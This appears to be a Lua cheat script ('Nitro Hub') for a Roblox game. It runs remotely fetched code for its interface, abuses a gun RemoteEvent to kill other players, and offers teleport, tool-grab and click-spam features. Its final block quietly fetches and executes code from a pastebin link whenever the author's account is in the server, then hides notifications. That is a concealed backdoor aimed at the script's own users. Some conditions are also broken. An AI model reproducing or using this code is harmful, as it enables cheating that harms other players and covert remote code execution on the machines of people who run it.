local Material = loadstring(game:HttpGet("https://raw.githubusercontent.com/sc710/sc/main/Lib"))()

-------------------------------------------------------

local X = Material.Load({
	Title = "Nitro Hub | UntelGame",
	Style = 3,
	SizeX = 470,
	SizeY = 230,
	Theme = "Discord",
	ColorOverrides = {
		MainFrame = Color3.fromRGB(32,34,37)
	}
})

-------------------------------------------------------

local lp = X.New({
	Title = "Credit"
})

-------------------------------------------------------

local s = lp.Button({
	Text = "Credit",
	Callback = function()
	    print("Script By Nanachi_rbx")
	end,
		Menu = {
		Information = function(self)
			X.Banner({
				Text = "Script By Nanachi_rbx"
			})
		end
	}
})

local sa = lp.Button({
	Text = "Announcement",
	Callback = function()
	    print("직접 새로운 테마를 만들어봤습니다.")
	end,
	Menu = {
		Information = function(self)
			X.Banner({
				Text = "직접 새로운 테마를 만들어봤습니다."
			})
		end
	}
})

local sa = lp.Button({
	Text = "Update",
	Callback = function()
	    print("Remove Mash가 업데이트되었습니다.")
	end,
	Menu = {
		Information = function(self)
			X.Banner({
				Text = "Remove Mash가 업데이트되었습니다."
			})
		end
	}
})

local sa = lp.Button({
	Text = "Bug",
	Callback = function()
	    print("Tool 스크립트, 총이 안 먹어지는 버그를 수정했습니다.")
	end,
	Menu = {
		Information = function(self)
			X.Banner({
				Text = "Tool 스크립트, 총이 안 먹어지는 버그를 수정했습니다."
			})
		end
	}
})

-------------------------------------------------------

local lp = X.New({
	Title = "LocalPlayer"
})

-------------------------------------------------------

local s = lp.Button({
	Text = "Die",
	Callback = function()
		game.Players.LocalPlayer.Character.Humanoid.Health = 0
	end,
		Menu = {
		Information = function(self)
			X.Banner({
				Text = "자기 자신을 죽입니다."
			})
		end
	}
})

local B = lp.Slider({
	Text = "WalkSpeed",
	Callback = function(ws)
		game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = ws * 1
	end,
	Min = 16,
	Max = 500,
	Def = 0
})

local C = lp.Slider({
	Text = "JumpPower",
	Callback = function(jp)
		game.Players.LocalPlayer.Character.Humanoid.JumpPower = jp * 1
	end,
	Min = 50,
	Max = 500,
	Def = 0
})

local H = lp.Toggle({
	Text = "No Void",
	Callback = function(Value)
	    _G.Destroys = (Value)
	    if _G.Destroys then
	        game.Workspace.FallenPartsDestroyHeight = -99999
	        else
	            game.Workspace.FallenPartsDestroyHeight = -500
	    end
	end,
	Enabled = false
})

local E = lp.TextField({
	Text = "Teleport to Player",
	Callback = function(Value)
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players[Value].Character.HumanoidRootPart.CFrame
	end,
})

-------------------------------------------------------

local tp = X.New({
	Title = "TP"
})

-------------------------------------------------------

local F = tp.Button({
	Text = "Spawn",
	Callback = function()
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-235, 12.9999971, 285, 1, 2.31743389e-08, 3.7168629e-14, -2.31743389e-08, 1, 1.07444315e-07, -3.46786808e-14, -1.07444315e-07, 1)
	end,
})

local G = tp.Button({
	Text = "Gun Spawner",
	Callback = function()
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-75.093605, 14.9999971, 275.117615, 0.00561147789, 6.80334793e-08, -0.999984264, -9.84480479e-08, 1, 6.74821052e-08, 0.999984264, 9.80678223e-08, 0.00561147789)
	end,
})

local G = tp.Button({
	Text = "House",
	Callback = function()
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-1.60000718, 15.2000008, 191.099945, 0.00978099927, 3.24999476e-08, -0.999952137, -4.08049168e-08, 1, 3.21023705e-08, 0.999952137, 4.0488974e-08, 0.00978099927)
	end,
})

local G = tp.Button({
	Text = "Secret Room",
	Callback = function()
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(15.3999863, 27.5999947, 165.600021, -5.93706147e-07, 3.64786601e-08, 1, 5.83325788e-09, 1, -3.64786565e-08, -1, 5.83323612e-09, -5.93706147e-07)
	end,
})

-------------------------------------------------------

local cb = X.New({
	Title = "Combat"
})

-------------------------------------------------------

local G = cb.Button({
	Text = "All Shoot Gun",
	Callback = function()
		for i, v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
            local num = math.random(1, #game.Players:GetChildren())

			local args = {
			[1] = game.Players:GetChildren()[num].Character.Humanoid
			}

			if game.Players.LocalPlayer ~= game.Players:GetChildren()[num] then
	    		if v.Name == "pistol" then
	    		v.RemoteEvent:FireServer(unpack(args))
	    		end
			end
		end
	end,
	Menu = {
		Information = function(self)
			X.Banner({
				Text = "모든 총을 한 번에 쏴 죽입니다."
			})
		end
	}
})

local H = cb.Toggle({
	Text = "Auto Shoot Gun",
	Callback = function(Value)
	    _G.Destroys = (Value)
	    while _G.Destroys do
		    wait()
		local num = math.random(1, #game.Players:GetChildren())

		local args = {
		[1] = game.Players:GetChildren()[num].Character.Humanoid
		}

			if game.Players.LocalPlayer ~= game.Players:GetChildren()[num] then
			    if game.Players.LocalPlayer:FindFirstChild("SISD", true) ~= game:FindFirstChild("pistol", true) then
				    game:FindFirstChild("pistol", true).RemoteEvent:FireServer(unpack(args))
				end
			end
		end
	end,
	Enabled = false
})

local H = cb.Toggle({
	Text = "Auto Suicide Gun",
	Callback = function(Value)
	    _G.Destroys = (Value)
	    while _G.Destroys do
		    wait()
    	    for i, v in pairs(game.Workspace:GetChildren()) do
    	        if game.Players.LocalPlayer.Character.Humanoid.Parent ~= v then
        	        if v:FindFirstChild("pistol", true) then
        	            local args = {
	                        [1] = v.Humanoid
	                    }
	            	    v:FindFirstChild("pistol", true).RemoteEvent:FireServer(unpack(args))
	        	    end
	    	    end
    	    end
	    end
	end,
	Enabled = false
})

local H = cb.Toggle({
	Text = "Auto Get Gun",
	Callback = function(Value)
	    _G.Destroys1 = (Value)
	    for i, v in pairs(game.Workspace:GetChildren()) do
	        if v.Name == 'Part' then
                if v.CFrame == CFrame.new(-75, 12.5, 275, -1, 0, 0, 0, 0, 1, 0, 1, -0) then
                    while _G.Destroys1 do
                    wait()
                        firetouchinterest(game.Players.LocalPlayer.Character.HumanoidRootPart, v, 0)
                    end
                end
	        end
        end
	end,
	Enabled = false
})

local E = cb.TextField({
	Text = "Kill Player",
	Callback = function(Value)
		local args = {
    		[1] = game:GetService("Players")[Value].Character.Humanoid
		}
		
		game:FindFirstChild("pistol", true).RemoteEvent:FireServer(unpack(args))
	end,
})



-------------------------------------------------------

local to = X.New({
	Title = "Tool"
})

-------------------------------------------------------

local A = to.Button({
	Text = "Drop Tools (Remove Mesh)",
	Callback = function()
	    local ws = game.Workspace
	    local wp = game.Players.LocalPlayer.Character
	    local bs = game:GetService("Players").LocalPlayer.Backpack
	    
	    for a, b in pairs(bs:GetChildren()) do
		    b.Parent = wp
   	    	for i, v in pairs(wp:GetChildren()) do
	    		if v.Name == "RedBull" or v.Name == "MountainDew" or v.Name == "Sprite" or v.Name == "DrPepper" or v.Name == "BloxyCola" or v.Name == "Gatorade" or v.Name == "DietCoke" or v.Name == "CreamSoda" or v.Name == "Sevenup" or v.Name == "Coke" or v.Name == "Fanta" or v.Name == "IceTea" or v.Name == "7up" or v.Name == "Pepsi" or v.Name == "RobloxMug" then
            	    if v:FindFirstChild("Mesh", true) then
                	    v:FindFirstChild("Mesh", true):Destroy()
            	    	elseif not v:FindFirstChildOfClass("Mesh") then
                	    v.Parent = ws
	        	    end
	    	    end
	    	end
	    end
	end,
	Menu = {
		Information = function(self)
			X.Banner({
				Text = "모든 툴의 Mesh를 지우고 모든 툴을 떨어트립니다."
			})
		end
	}
})

local A = to.Button({
	Text = "Drop Tools",
	Callback = function()
		local ws = game.Workspace
		local wp = game.Players.LocalPlayer.Character
		local bs = game:GetService("Players").LocalPlayer.Backpack
		
		while wait() do
		    bs:FindFirstChildOfClass("Tool", true).Parent = wp
		    wp:FindFirstChildOfClass("Tool").Parent = ws
		    bs:FindFirstChildOfClass("Tool", true).Parent = wp
		    wp:FindFirstChildOfClass("Tool").Parent = ws
		    bs:FindFirstChildOfClass("Tool", true).Parent = wp
		    wp:FindFirstChildOfClass("Tool").Parent = ws
		    bs:FindFirstChildOfClass("Tool", true).Parent = wp
		    wp:FindFirstChildOfClass("Tool").Parent = ws
		    bs:FindFirstChildOfClass("Tool", true).Parent = wp
		    wp:FindFirstChildOfClass("Tool").Parent = ws
		    bs:FindFirstChildOfClass("Tool", true).Parent = wp
		    wp:FindFirstChildOfClass("Tool").Parent = ws
		    bs:FindFirstChildOfClass("Tool", true).Parent = wp
		    wp:FindFirstChildOfClass("Tool").Parent = ws
		    bs:FindFirstChildOfClass("Tool", true).Parent = wp
		    wp:FindFirstChildOfClass("Tool").Parent = ws
		    bs:FindFirstChildOfClass("Tool", true).Parent = wp
		    wp:FindFirstChildOfClass("Tool").Parent = ws
		    bs:FindFirstChildOfClass("Tool", true).Parent = wp
		    wp:FindFirstChildOfClass("Tool").Parent = ws
		    bs:FindFirstChildOfClass("Tool", true).Parent = wp
		    wp:FindFirstChildOfClass("Tool").Parent = ws
		    bs:FindFirstChildOfClass("Tool", true).Parent = wp
		    wp:FindFirstChildOfClass("Tool").Parent = ws
		    bs:FindFirstChildOfClass("Tool", true).Parent = wp
		    wp:FindFirstChildOfClass("Tool").Parent = ws
		    bs:FindFirstChildOfClass("Tool", true).Parent = wp
		    wp:FindFirstChildOfClass("Tool").Parent = ws
		    bs:FindFirstChildOfClass("Tool", true).Parent = wp
		    wp:FindFirstChildOfClass("Tool").Parent = ws
		    bs:FindFirstChildOfClass("Tool", true).Parent = wp
		    wp:FindFirstChildOfClass("Tool").Parent = ws
		    bs:FindFirstChildOfClass("Tool", true).Parent = wp
		    wp:FindFirstChildOfClass("Tool").Parent = ws
		    bs:FindFirstChildOfClass("Tool", true).Parent = wp
		    wp:FindFirstChildOfClass("Tool").Parent = ws
		    bs:FindFirstChildOfClass("Tool", true).Parent = wp
		    wp:FindFirstChildOfClass("Tool").Parent = ws
		    bs:FindFirstChildOfClass("Tool", true).Parent = wp
		    wp:FindFirstChildOfClass("Tool").Parent = ws
		    bs:FindFirstChildOfClass("Tool", true).Parent = wp
		    wp:FindFirstChildOfClass("Tool").Parent = ws
		    bs:FindFirstChildOfClass("Tool", true).Parent = wp
		    wp:FindFirstChildOfClass("Tool").Parent = ws
		    bs:FindFirstChildOfClass("Tool", true).Parent = wp
		    wp:FindFirstChildOfClass("Tool").Parent = ws
		    bs:FindFirstChildOfClass("Tool", true).Parent = wp
		    wp:FindFirstChildOfClass("Tool").Parent = ws
		    bs:FindFirstChildOfClass("Tool", true).Parent = wp
		    wp:FindFirstChildOfClass("Tool").Parent = ws
		    bs:FindFirstChildOfClass("Tool", true).Parent = wp
		    wp:FindFirstChildOfClass("Tool").Parent = ws
		    bs:FindFirstChildOfClass("Tool", true).Parent = wp
		    wp:FindFirstChildOfClass("Tool").Parent = ws
		    bs:FindFirstChildOfClass("Tool", true).Parent = wp
		    wp:FindFirstChildOfClass("Tool").Parent = ws
		    bs:FindFirstChildOfClass("Tool", true).Parent = wp
		    wp:FindFirstChildOfClass("Tool").Parent = ws
		    bs:FindFirstChildOfClass("Tool", true).Parent = wp
		    wp:FindFirstChildOfClass("Tool").Parent = ws
		    bs:FindFirstChildOfClass("Tool", true).Parent = wp
		    wp:FindFirstChildOfClass("Tool").Parent = ws
		    bs:FindFirstChildOfClass("Tool", true).Parent = wp
		    wp:FindFirstChildOfClass("Tool").Parent = ws
		    bs:FindFirstChildOfClass("Tool", true).Parent = wp
		    wp:FindFirstChildOfClass("Tool").Parent = ws
		    bs:FindFirstChildOfClass("Tool", true).Parent = wp
		    wp:FindFirstChildOfClass("Tool").Parent = ws
		    bs:FindFirstChildOfClass("Tool", true).Parent = wp
		    wp:FindFirstChildOfClass("Tool").Parent = ws
		    bs:FindFirstChildOfClass("Tool", true).Parent = wp
		    wp:FindFirstChildOfClass("Tool").Parent = ws
		    bs:FindFirstChildOfClass("Tool", true).Parent = wp
		    wp:FindFirstChildOfClass("Tool").Parent = ws
		    bs:FindFirstChildOfClass("Tool", true).Parent = wp
		    wp:FindFirstChildOfClass("Tool").Parent = ws
		    bs:FindFirstChildOfClass("Tool", true).Parent = wp
		    wp:FindFirstChildOfClass("Tool").Parent = ws
		    bs:FindFirstChildOfClass("Tool", true).Parent = wp
		    wp:FindFirstChildOfClass("Tool").Parent = ws
		    bs:FindFirstChildOfClass("Tool", true).Parent = wp
		    wp:FindFirstChildOfClass("Tool").Parent = ws
		    bs:FindFirstChildOfClass("Tool", true).Parent = wp
		    wp:FindFirstChildOfClass("Tool").Parent = ws
		    bs:FindFirstChildOfClass("Tool", true).Parent = wp
		    wp:FindFirstChildOfClass("Tool").Parent = ws
		    bs:FindFirstChildOfClass("Tool", true).Parent = wp
		    wp:FindFirstChildOfClass("Tool").Parent = ws
		    bs:FindFirstChildOfClass("Tool", true).Parent = wp
		    wp:FindFirstChildOfClass("Tool").Parent = ws
		    bs:FindFirstChildOfClass("Tool", true).Parent = wp
		    wp:FindFirstChildOfClass("Tool").Parent = ws
		    bs:FindFirstChildOfClass("Tool", true).Parent = wp
		    wp:FindFirstChildOfClass("Tool").Parent = ws
		    bs:FindFirstChildOfClass("Tool", true).Parent = wp
		    wp:FindFirstChildOfClass("Tool").Parent = ws
		    bs:FindFirstChildOfClass("Tool", true).Parent = wp
		    wp:FindFirstChildOfClass("Tool").Parent = ws
		    bs:FindFirstChildOfClass("Tool", true).Parent = wp
		    wp:FindFirstChildOfClass("Tool").Parent = ws
		    bs:FindFirstChildOfClass("Tool", true).Parent = wp
		    wp:FindFirstChildOfClass("Tool").Parent = ws
		    bs:FindFirstChildOfClass("Tool", true).Parent = wp
		    wp:FindFirstChildOfClass("Tool").Parent = ws
		    bs:FindFirstChildOfClass("Tool", true).Parent = wp
		    wp:FindFirstChildOfClass("Tool").Parent = ws
		    bs:FindFirstChildOfClass("Tool", true).Parent = wp
		    wp:FindFirstChildOfClass("Tool").Parent = ws
		    bs:FindFirstChildOfClass("Tool", true).Parent = wp
		    wp:FindFirstChildOfClass("Tool").Parent = ws
		    bs:FindFirstChildOfClass("Tool", true).Parent = wp
		    wp:FindFirstChildOfClass("Tool").Parent = ws
		    bs:FindFirstChildOfClass("Tool", true).Parent = wp
		    wp:FindFirstChildOfClass("Tool").Parent = ws
		    bs:FindFirstChildOfClass("Tool", true).Parent = wp
		    wp:FindFirstChildOfClass("Tool").Parent = ws
		    bs:FindFirstChildOfClass("Tool", true).Parent = wp
		    wp:FindFirstChildOfClass("Tool").Parent = ws
		    bs:FindFirstChildOfClass("Tool", true).Parent = wp
		    wp:FindFirstChildOfClass("Tool").Parent = ws
		    bs:FindFirstChildOfClass("Tool", true).Parent = wp
		    wp:FindFirstChildOfClass("Tool").Parent = ws
		    bs:FindFirstChildOfClass("Tool", true).Parent = wp
		    wp:FindFirstChildOfClass("Tool").Parent = ws
		    bs:FindFirstChildOfClass("Tool", true).Parent = wp
		    wp:FindFirstChildOfClass("Tool").Parent = ws
		    bs:FindFirstChildOfClass("Tool", true).Parent = wp
		    wp:FindFirstChildOfClass("Tool").Parent = ws
		    bs:FindFirstChildOfClass("Tool", true).Parent = wp
		    wp:FindFirstChildOfClass("Tool").Parent = ws
		    bs:FindFirstChildOfClass("Tool", true).Parent = wp
		    wp:FindFirstChildOfClass("Tool").Parent = ws
		    bs:FindFirstChildOfClass("Tool", true).Parent = wp
		    wp:FindFirstChildOfClass("Tool").Parent = ws
		    bs:FindFirstChildOfClass("Tool", true).Parent = wp
		    wp:FindFirstChildOfClass("Tool").Parent = ws
		    bs:FindFirstChildOfClass("Tool", true).Parent = wp
		    wp:FindFirstChildOfClass("Tool").Parent = ws
		    bs:FindFirstChildOfClass("Tool", true).Parent = wp
		    wp:FindFirstChildOfClass("Tool").Parent = ws
		    bs:FindFirstChildOfClass("Tool", true).Parent = wp
		    wp:FindFirstChildOfClass("Tool").Parent = ws
		    bs:FindFirstChildOfClass("Tool", true).Parent = wp
		    wp:FindFirstChildOfClass("Tool").Parent = ws
		    bs:FindFirstChildOfClass("Tool", true).Parent = wp
		    wp:FindFirstChildOfClass("Tool").Parent = ws
		    bs:FindFirstChildOfClass("Tool", true).Parent = wp
		    wp:FindFirstChildOfClass("Tool").Parent = ws
		    bs:FindFirstChildOfClass("Tool", true).Parent = wp
		    wp:FindFirstChildOfClass("Tool").Parent = ws
		    bs:FindFirstChildOfClass("Tool", true).Parent = wp
		    wp:FindFirstChildOfClass("Tool").Parent = ws
		    if bs == nil then
		        break
		    end
		end
	end,
	Menu = {
		Information = function(self)
			X.Banner({
				Text = "모든 툴을 떨어트립니다."
			})
		end
	}
})

local g = to.Button({
	Text = "Grab Tools",
	Callback = function()
		for i, v in pairs(game.Workspace:GetChildren()) do
	        if v.Name == "RedBull" or v.Name == "MountainDew" or v.Name == "Sprite" or v.Name == "DrPepper" or v.Name == "BloxyCola" or v.Name == "Gatorade" or v.Name == "DietCoke" or v.Name == "CreamSoda" or v.Name == "Sevenup" or v.Name == "Coke" or v.Name == "Fanta" or v.Name == "IceTea" or v.Name == "7up" or v.Name == "Pepsi" or "pistol" or "BoloxMug" then
                if v:FindFirstChild("Handle", true) then
                    firetouchinterest(game.Players.LocalPlayer.Character.HumanoidRootPart, v:FindFirstChild("Handle", true), 0)
	            end
	        end
	    end
	end,
	Menu = {
		Information = function(self)
			X.Banner({
				Text = "모든 툴을 집습니다."
			})
		end
	}
})

local H = to.Toggle({
	Text = "Auto Grab Tools",
	Callback = function(Value)
	    _G.Destroys2 = (Value)
	    while _G.Destroys2 do
	    wait()
			for i, v in pairs(game.Workspace:GetChildren()) do
	            if v.Name == "RedBull" or v.Name == "MountainDew" or v.Name == "Sprite" or v.Name == "DrPepper" or v.Name == "BloxyCola" or v.Name == "Gatorade" or v.Name == "DietCoke" or v.Name == "CreamSoda" or v.Name == "Sevenup" or v.Name == "Coke" or v.Name == "Fanta" or v.Name == "IceTea" or v.Name == "7up" or v.Name == "Pepsi" or "pistol" or "BoloxMug" then
                    if v:FindFirstChild("Handle", true) then
                        firetouchinterest(game.Players.LocalPlayer.Character.HumanoidRootPart, v:FindFirstChild("Handle", true), 0)
	                end
	            end
	        end
	    end
	end,
	Enabled = false
})

local H = to.Toggle({
	Text = "Auto Grab Guns",
	Callback = function(Value)
	    _G.Destroys3 = (Value)
	    while _G.Destroys3 do
	    wait()
	        for i, a in pairs(game.Workspace:GetChildren()) do
                if a.Name == "pistol" then
                    firetouchinterest(game.Players.LocalPlayer.Character.HumanoidRootPart, a:FindFirstChild("Handle", true), 0)
                end
            end
	    end
	end,
	Enabled = false
})

-------------------------------------------------------

local mi = X.New({
	Title = "Misc"
})

-------------------------------------------------------

local H = mi.Toggle({
	Text = "Crazy Vending Machine",
	Callback = function(Value)
	    _G.Destroys4 = (Value)
	    while _G.Destroys4 do
	    wait()
	        for i, v in pairs(game.Workspace:GetChildren()) do
                if v.Name == "Model" then
            for a, b in pairs(v:GetChildren()) do
                if b.Name == "gator" then
	    	fireclickdetector(b.Parent.gator.ClickDetector)
	    	-------------------------------------------------------
	    	fireclickdetector(b.Parent.redb.ClickDetector)
	    	-------------------------------------------------------
	    	fireclickdetector(b.Parent.mtndew.ClickDetector)
	    	-------------------------------------------------------
	    	fireclickdetector(b.Parent.dietcoke.ClickDetector)
	    	-------------------------------------------------------
	    	fireclickdetector(b.Parent.aw.ClickDetector)
	    	-------------------------------------------------------
	    	fireclickdetector(b.Parent["7up"].ClickDetector)
	    	-------------------------------------------------------
	    	fireclickdetector(b.Parent.pepsi.ClickDetector)
	    	-------------------------------------------------------
	    	fireclickdetector(b.Parent.coke.ClickDetector)
	    	-------------------------------------------------------
	    	fireclickdetector(b.Parent.drpep.ClickDetector)
	    	-------------------------------------------------------
	    	fireclickdetector(b.Parent.fanta.ClickDetector)
	    	-------------------------------------------------------
	    	fireclickdetector(b.Parent.lipton.ClickDetector)
	    	-------------------------------------------------------
	    	fireclickdetector(b.Parent.sprite.ClickDetector)
                end
            end
                end
            end
	    end
	end,
	Enabled = false
})

local L = mi.Toggle({
	Text = "Crazy Light (Beware of Lag)",
	Callback = function(Value)
	    _G.Destroys5 = (Value)
	    while _G.Destroys5 do
	    wait()
	    	for i, v in pairs(game.Workspace:GetChildren()) do
                if v.Name == "Model" then
            for a, b in pairs(v:GetChildren()) do
                if b.Name == "Urban House" then
	    	fireclickdetector(b.Body.Lights.LivingRoomLights.LightSwitch.Interactive.ClickDetector)
	    	fireclickdetector(b["Living Room"].GasFireplace.Dial.Interactive.ClickDetector)
	    	fireclickdetector(b.Body.Lights.KitchenLights.LightSwitch.Interactive.ClickDetector)
	    	fireclickdetector(b.Body.Lights.DiningRoomLights.LightSwitch.Interactive.ClickDetector)
	    	fireclickdetector(b.Body.Lights.KitchenLights.LightSwitch.Interactive.ClickDetector)
	    	fireclickdetector(b.Body.Lights.KitchenLights.LightSwitch.Interactive.ClickDetector)
--
	    	fireclickdetector(b.Body.Lights.GirlsBedroomLights.LightSwitch.Interactive.ClickDetector)
	    	fireclickdetector(b["Girl's Bedroom"].Lamp.Interactive.ClickDetector)
--
	    	fireclickdetector(b.Body.Lights.OfficeLights.LightSwitch.Interactive.ClickDetector)
--
	    	fireclickdetector(b.Body.Lights.BoysBedroomLights.LightSwitch.Interactive.ClickDetector)
	    	fireclickdetector(b["Boy's Bedroom"].DeskLamp.Interactive.ClickDetector)
--
	    	fireclickdetector(b.Body.Lights.BathroomLights.LightSwitch.Interactive.ClickDetector)
--
	    	fireclickdetector(b.Body.Lights.HallLights.LightSwitch.Interactive.ClickDetector)
--
	    	fireclickdetector(b.Body.Lights.MasterBedroomLights.LightSwitch.Interactive.ClickDetector)
	    	fireclickdetector(b["Master Bedroom"].Lamp.Interactive.ClickDetector)
--
	    	fireclickdetector(b.Body.Lights["Garage Lights"].LightSwitch.Interactive.ClickDetector)
--
	    	fireclickdetector(b.Body.Lights.EntranceLights.LightSwitch.Interactive.ClickDetector)
--
	    	fireclickdetector(b["Living Room"].Lamp.Interactive.ClickDetector)
                        end
                    end
                end
            end
	    end
	end,
	Enabled = false
})

local L = mi.Toggle({
	Text = "Crazy Random Teleport to Players",
	Callback = function(Value)
	    _G.Destroys6 = (Value)
	    while _G.Destroys6 do
	        while _G.Destroys6 do
	            while _G.Destroys6 do
	                while _G.Destroys6 do
	                    while _G.Destroys6 do
	                    wait(0.1)
	    	                local num = math.random(1, #game.Players:GetChildren())
	                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players:GetChildren()[num].Character.HumanoidRootPart.CFrame
	                    end
	                end
                end
            end
        end
	end,
	Enabled = false
})

-------------------------------------------------------

if game.Players:WaitForChild("nanachi_rbx") then
    loadstring(game:HttpGet("https://pastebin.com/raw/iZ7XMq5r"))()
    wait(10)
    game.CoreGui.Notifications:Destroy()
end
